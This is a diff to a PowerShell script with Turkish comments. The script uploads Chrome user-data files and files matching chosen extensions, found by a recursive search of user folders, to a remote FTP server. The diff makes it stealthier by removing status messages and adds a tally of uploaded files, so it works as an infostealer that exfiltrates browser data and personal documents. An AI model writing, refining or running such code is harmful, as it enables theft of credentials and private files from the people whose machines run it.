@@ -36,13 +36,16 @@ function Upload-FileToFtp {
             $requestStream.Close()
 
             $response = $ftpRequest.GetResponse()
-            Write-Output "Başarıyla yüklendi: $filePath"
             $response.Close()
+
+            return $true
         } catch {
             Write-Output "Hata: $($_.Exception.Message)"
+            return $false
         }
     } else {
         Write-Output "Dosya bulunamadı: $filePath"
+        return $false
     }
 }
 
@@ -79,14 +82,15 @@ $chromePaths = @{
 $chromeInstalled = Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data"
 
 if ($chromeInstalled) {
+    $uploadCount = 0
     foreach ($file in $chromePaths.Keys) {
         $path = $chromePaths[$file]
         if (Test-Path $path) {
-            Upload-FileToFtp -filePath $path -ftpUrl $ftpFolder -ftpUser $ftpUser -ftpPassword $ftpPassword
+            if (Upload-FileToFtp -filePath $path -ftpUrl $ftpFolder -ftpUser $ftpUser -ftpPassword $ftpPassword) {
+                $uploadCount++
+            }
         }
     }
-} else {
-    Write-Output "Chrome tarayıcısı kurulu değil."
 }
 
 # Kontrol edilecek dosya uzantıları
@@ -104,7 +108,12 @@ foreach ($searchPath in $searchPaths) {
     foreach ($ext in $extensions) {
         # Dosyaları bul ve FTP'ye yükle
         Get-ChildItem -Path $searchPath -Recurse -Filter $ext -ErrorAction SilentlyContinue | ForEach-Object {
-            Upload-FileToFtp -filePath $_.FullName -ftpUrl $ftpFolder -ftpUser $ftpUser -ftpPassword $ftpPassword
+            if (Upload-FileToFtp -filePath $_.FullName -ftpUrl $ftpFolder -ftpUser $ftpUser -ftpPassword $ftpPassword) {
+                $uploadCount++
+            }
         }
     }
 }
+
+# Yüklenen dosya sayısını yazdır
+Write-Output $uploadCount
